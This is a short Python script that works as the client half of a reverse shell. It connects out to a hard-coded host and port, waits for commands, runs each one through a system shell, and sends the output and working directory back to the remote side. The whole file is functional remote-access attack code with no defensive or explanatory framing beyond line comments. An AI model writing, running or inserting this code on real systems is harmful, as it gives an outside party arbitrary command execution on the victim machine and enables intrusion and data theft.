import os
import socket
import subprocess

s = socket.socket()
port = 9999
host = '192.168.0.4'
s.connect((host, port))
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))      # changes the directory
    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # Run a command like in a terminal
        output_bytes = cmd.stdout.read() + cmd.stderr.read()    # output in bytes
        output_str = str(output_bytes, "utf-8")                 # output in string
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))        # To get output display like in a command prompt
                                                                        # getcwd() gives the current working directory
# Close connection
s.close()
